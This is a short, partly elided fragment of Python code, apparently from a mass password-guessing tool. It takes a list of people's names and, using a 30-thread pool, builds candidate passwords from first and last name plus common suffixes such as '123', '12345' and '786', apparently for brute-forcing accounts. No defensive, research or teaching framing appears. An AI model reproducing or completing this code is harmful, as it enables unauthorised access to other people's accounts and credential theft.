...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			pwv.append(yuzong.lower().split(" ")[0]+yuzong.lower().split(" ")[1]+"123")
			pwv.append(yuzong.lower().split(" ")[0]+yuzong.lower().split(" ")[1]+"12345")
			pwv.append(yuzong.lower().split(" ")[0]+yuzong.lower().split(" ")[1]+"786")
			pwv.append(yuzong.lower().split(" ")[0]+yuzong.lower().split(" ")[1]+"1")
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
